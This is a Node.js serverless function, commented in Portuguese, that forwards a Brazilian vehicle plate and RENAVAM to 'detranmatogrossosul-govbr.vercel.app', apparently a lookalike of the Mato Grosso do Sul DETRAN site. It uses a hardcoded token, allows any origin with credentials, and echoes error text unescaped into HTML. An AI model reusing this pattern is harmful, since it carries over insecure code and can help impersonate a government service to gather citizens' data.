const axios = require('axios');

module.exports = async (req, res) => {
  console.log('📨 Recebida requisição:', req.method, req.url);
  
  // Configura CORS IMEDIATAMENTE
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  
  // Responde a OPTIONS (CORS preflight) IMEDIATAMENTE
  if (req.method === 'OPTIONS') {
    console.log('✅ Respondendo OPTIONS (CORS)');
    return res.status(200).end();
  }
  
  // Só continua se for POST
  if (req.method !== 'POST') {
    console.log('❌ Método não permitido:', req.method);
    return res.status(405).json({ 
      error: 'Método não permitido. Use POST.',
      received: req.method,
      allowed: 'POST'
    });
  }
  
  try {
    console.log('📝 Corpo da requisição:', req.body);
    
    // Verifica se tem corpo JSON
    if (!req.body || typeof req.body !== 'object') {
      return res.status(400).json({ error: 'Corpo da requisição deve ser JSON' });
    }
    
    const { placa, renavam } = req.body;
    
    if (!placa || !renavam) {
      return res.status(400).json({ error: 'Placa e RENAVAM são obrigatórios' });
    }
    
    console.log(`🔍 Consultando: Placa ${placa}, RENAVAM ${renavam}`);
    
    // 1. Usa o token
    const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZW5hdmFtIjoiMDA0Njc4ODA0NzYiLCJwbGF0ZSI6Ik5SUzVKNDciLCJpYXQiOjE3NzAzMzIwMzR9.QmpzZTRGYiTxapKcyIzd8eZxooEGtQM3sAsMevX125c';

    // 2. Consulta a API externa
    console.log('🌐 Chamando API externa...');
    const resposta1 = await axios.post(
      'https://detranmatogrossosul-govbr.vercel.app/api/scrape5',
      { renavam, plate: placa },
      { headers: { Authorization: token } }
    );

    const userId = resposta1.data.userId;
    console.log(`✅ User ID obtido: ${userId}`);

    // 3. Busca os dados completos
    console.log('🌐 Buscando dados completos...');
    const resposta2 = await axios.get(
      `https://detranmatogrossosul-govbr.vercel.app/veiculo/${userId}`
    );

    console.log('✅ Dados recebidos, enviando resposta...');
    
    // 4. Retorna os dados HTML
    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(resposta2.data);

  } catch (error) {
    console.error('💥 ERRO na consulta:', error.message);
    console.error('Stack:', error.stack);
    
    res.status(500).send(`
      <html>
        <body>
          <h1>Erro na consulta</h1>
          <p>${error.message}</p>
          <p>Tente novamente em alguns instantes.</p>
        </body>
      </html>
    `);
  }
};
